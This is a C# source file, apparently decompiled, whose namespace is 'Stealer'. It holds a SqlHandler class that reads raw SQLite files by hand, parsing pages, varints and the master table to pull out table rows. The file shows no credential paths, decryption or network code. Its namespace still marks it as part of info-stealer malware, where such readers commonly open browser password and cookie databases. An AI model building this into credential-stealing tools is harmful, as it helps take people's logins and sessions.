using System;
using System.IO;
using System.Text;

namespace Stealer;

internal class SqlHandler
{
	private struct RecordHeaderField
	{
		public long Size;

		public long Type;
	}

	private struct TableEntry
	{
		public string[] Content;
	}

	private struct SqliteMasterEntry
	{
		public string ItemName;

		public long RootNum;

		public string SqlStatement;
	}

	private readonly byte[] _sqlDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };

	private readonly ulong _dbEncoding;

	private readonly byte[] _fileBytes;

	private readonly ulong _pageSize;

	private string[] _fieldNames;

	private SqliteMasterEntry[] _masterTableEntries;

	private TableEntry[] _tableEntries;

	public SqlHandler(string fileName)
	{
		_fileBytes = File.ReadAllBytes(fileName);
		_pageSize = ConvertToULong(16, 2);
		_dbEncoding = ConvertToULong(56, 4);
		ReadMasterTable(100L);
	}

	public string GetValue(int rowNum, int field)
	{
		try
		{
			if (rowNum >= _tableEntries.Length)
			{
				return null;
			}
			return (field >= _tableEntries[rowNum].Content.Length) ? null : _tableEntries[rowNum].Content[field];
		}
		catch
		{
			return null;
		}
	}

	public int GetRowCount()
	{
		return _tableEntries.Length;
	}

	private bool ReadTableFromOffset(ulong offset)
	{
		try
		{
			if (_fileBytes[offset] == 13)
			{
				uint num = (uint)(ConvertToULong((int)offset + 3, 2) - 1L);
				int num2 = 0;
				if (_tableEntries != null)
				{
					num2 = _tableEntries.Length;
					Array.Resize(ref _tableEntries, _tableEntries.Length + (int)num + 1);
				}
				else
				{
					_tableEntries = new TableEntry[num + 1];
				}
				for (uint num3 = 0u; (int)num3 <= (int)num; num3++)
				{
					ulong num4 = ConvertToULong((int)offset + 8 + (int)(num3 * 2), 2);
					if (offset != 100L)
					{
						num4 += offset;
					}
					int num5 = Gvl((int)num4);
					Cvl((int)num4, num5);
					int num6 = Gvl((int)((long)num4 + ((long)num5 - (long)num4) + 1L));
					Cvl((int)((long)num4 + ((long)num5 - (long)num4) + 1L), num6);
					ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
					int num8 = Gvl((int)num7);
					int num9 = num8;
					long num10 = Cvl((int)num7, num8);
					RecordHeaderField[] array = null;
					long num11 = (long)num7 - (long)num8 + 1L;
					int num12 = 0;
					while (num11 < num10)
					{
						Array.Resize(ref array, num12 + 1);
						int num13 = num9 + 1;
						num9 = Gvl(num13);
						array[num12].Type = Cvl(num13, num9);
						array[num12].Size = ((array[num12].Type <= 9L) ? _sqlDataTypeSize[array[num12].Type] : ((!IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L)));
						num11 = num11 + (num9 - num13) + 1L;
						num12++;
					}
					if (array == null)
					{
						continue;
					}
					_tableEntries[num2 + (int)num3].Content = new string[array.Length];
					int num14 = 0;
					for (int i = 0; i <= array.Length - 1; i++)
					{
						if (array[i].Type > 9L)
						{
							if (!IsOdd(array[i].Type))
							{
								if (_dbEncoding == 1L)
								{
									_tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(_fileBytes, (int)((long)num7 + num10 + num14), (int)array[i].Size);
								}
								else if (_dbEncoding == 2L)
								{
									_tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(_fileBytes, (int)((long)num7 + num10 + num14), (int)array[i].Size);
								}
								else if (_dbEncoding == 3L)
								{
									_tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num7 + num10 + num14), (int)array[i].Size);
								}
							}
							else
							{
								_tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(_fileBytes, (int)((long)num7 + num10 + num14), (int)array[i].Size);
							}
						}
						else
						{
							_tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(ConvertToULong((int)((long)num7 + num10 + num14), (int)array[i].Size));
						}
						num14 += (int)array[i].Size;
					}
				}
			}
			else if (_fileBytes[offset] == 5)
			{
				uint num15 = (uint)(ConvertToULong((int)(offset + 3L), 2) - 1L);
				for (uint num16 = 0u; (int)num16 <= (int)num15; num16++)
				{
					uint num17 = (uint)ConvertToULong((int)offset + 12 + (int)(num16 * 2), 2);
					ReadTableFromOffset((ConvertToULong((int)(offset + num17), 4) - 1L) * _pageSize);
				}
				ReadTableFromOffset((ConvertToULong((int)(offset + 8L), 4) - 1L) * _pageSize);
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	private void ReadMasterTable(long offset)
	{
		try
		{
			switch (_fileBytes[offset])
			{
			case 13:
			{
				ulong num3 = ConvertToULong((int)offset + 3, 2) - 1L;
				int num4 = 0;
				if (_masterTableEntries != null)
				{
					num4 = _masterTableEntries.Length;
					Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num3 + 1);
				}
				else
				{
					checked
					{
						_masterTableEntries = new SqliteMasterEntry[(ulong)unchecked((long)(num3 + 1L))];
					}
				}
				for (ulong num5 = 0uL; num5 <= num3; num5++)
				{
					ulong num6 = ConvertToULong((int)offset + 8 + (int)num5 * 2, 2);
					if (offset != 100L)
					{
						num6 += (ulong)offset;
					}
					int num7 = Gvl((int)num6);
					Cvl((int)num6, num7);
					int num8 = Gvl((int)((long)num6 + ((long)num7 - (long)num6) + 1L));
					Cvl((int)((long)num6 + ((long)num7 - (long)num6) + 1L), num8);
					ulong num9 = num6 + (ulong)((long)num8 - (long)num6 + 1L);
					int num10 = Gvl((int)num9);
					int num11 = num10;
					long num12 = Cvl((int)num9, num10);
					long[] array = new long[5];
					for (int j = 0; j <= 4; j++)
					{
						int startIdx = num11 + 1;
						num11 = Gvl(startIdx);
						array[j] = Cvl(startIdx, num11);
						array[j] = ((array[j] <= 9L) ? _sqlDataTypeSize[array[j]] : ((!IsOdd(array[j])) ? ((array[j] - 12L) / 2L) : ((array[j] - 13L) / 2L)));
					}
					if (_dbEncoding == 1L || _dbEncoding == 2L)
					{
						if (_dbEncoding == 1L)
						{
							_masterTableEntries[num4 + (int)num5].ItemName = Encoding.Default.GetString(_fileBytes, (int)((long)num9 + num12 + array[0]), (int)array[1]);
						}
						else if (_dbEncoding == 2L)
						{
							_masterTableEntries[num4 + (int)num5].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)((long)num9 + num12 + array[0]), (int)array[1]);
						}
						else if (_dbEncoding == 3L)
						{
							_masterTableEntries[num4 + (int)num5].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num9 + num12 + array[0]), (int)array[1]);
						}
					}
					_masterTableEntries[num4 + (int)num5].RootNum = (long)ConvertToULong((int)((long)num9 + num12 + array[0] + array[1] + array[2]), (int)array[3]);
					if (_dbEncoding == 1L)
					{
						_masterTableEntries[num4 + (int)num5].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)((long)num9 + num12 + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
					}
					else if (_dbEncoding == 2L)
					{
						_masterTableEntries[num4 + (int)num5].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)((long)num9 + num12 + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
					}
					else if (_dbEncoding == 3L)
					{
						_masterTableEntries[num4 + (int)num5].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num9 + num12 + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
					}
				}
				break;
			}
			case 5:
			{
				uint num = (uint)(ConvertToULong((int)offset + 3, 2) - 1L);
				for (int i = 0; i <= (int)num; i++)
				{
					uint num2 = (uint)ConvertToULong((int)offset + 12 + i * 2, 2);
					if (offset == 100L)
					{
						ReadMasterTable((long)((ConvertToULong((int)num2, 4) - 1L) * _pageSize));
					}
					else
					{
						ReadMasterTable((long)((ConvertToULong((int)(offset + num2), 4) - 1L) * _pageSize));
					}
				}
				ReadMasterTable((long)((ConvertToULong((int)offset + 8, 4) - 1L) * _pageSize));
				break;
			}
			}
		}
		catch
		{
		}
	}

	public bool ReadTable(string tableName)
	{
		try
		{
			int num = -1;
			for (int i = 0; i <= _masterTableEntries.Length; i++)
			{
				if (string.Compare(_masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return false;
			}
			string[] array = _masterTableEntries[num].SqlStatement.Substring(_masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[1] { ',' });
			for (int j = 0; j <= array.Length - 1; j++)
			{
				array[j] = array[j].TrimStart(new char[0]);
				int num2 = array[j].IndexOf(' ');
				if (num2 > 0)
				{
					array[j] = array[j].Substring(0, num2);
				}
				if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
				{
					Array.Resize(ref _fieldNames, j + 1);
					_fieldNames[j] = array[j];
				}
			}
			return ReadTableFromOffset((ulong)(_masterTableEntries[num].RootNum - 1L) * _pageSize);
		}
		catch
		{
			return false;
		}
	}

	private ulong ConvertToULong(int startIndex, int size)
	{
		try
		{
			if (size > 8 || size == 0)
			{
				return 0uL;
			}
			ulong num = 0uL;
			for (int i = 0; i <= size - 1; i++)
			{
				num = (num << 8) | _fileBytes[startIndex + i];
			}
			return num;
		}
		catch
		{
			return 0uL;
		}
	}

	private int Gvl(int startIdx)
	{
		try
		{
			if (startIdx > _fileBytes.Length)
			{
				return 0;
			}
			int num = startIdx;
			while (true)
			{
				if (num <= startIdx + 8)
				{
					if (num <= _fileBytes.Length - 1)
					{
						if ((_fileBytes[num] & 0x80) != 128)
						{
							break;
						}
						num++;
						continue;
					}
					return 0;
				}
				return startIdx + 8;
			}
			return num;
		}
		catch
		{
			return 0;
		}
	}

	private long Cvl(int startIdx, int endIdx)
	{
		try
		{
			endIdx++;
			byte[] array = new byte[8];
			int num = endIdx - startIdx;
			bool flag = false;
			if (num == 0 || num > 9)
			{
				return 0L;
			}
			switch (num)
			{
			case 1:
				array[0] = (byte)(_fileBytes[startIdx] & 0x7Fu);
				return BitConverter.ToInt64(array, 0);
			case 9:
				flag = true;
				break;
			}
			int num2 = 1;
			int num3 = 7;
			int num4 = 0;
			if (flag)
			{
				array[0] = _fileBytes[endIdx - 1];
				endIdx--;
				num4 = 1;
			}
			for (int i = endIdx - 1; i >= startIdx; i += -1)
			{
				if (i - 1 >= startIdx)
				{
					array[num4] = (byte)(((_fileBytes[i] >> num2 - 1) & (255 >> num2)) | (_fileBytes[i - 1] << num3));
					num2++;
					num4++;
					num3--;
				}
				else if (!flag)
				{
					array[num4] = (byte)((_fileBytes[i] >> num2 - 1) & (255 >> num2));
				}
			}
			return BitConverter.ToInt64(array, 0);
		}
		catch
		{
			return 0L;
		}
	}

	private static bool IsOdd(long value)
	{
		return (value & 1L) == 1L;
	}
}
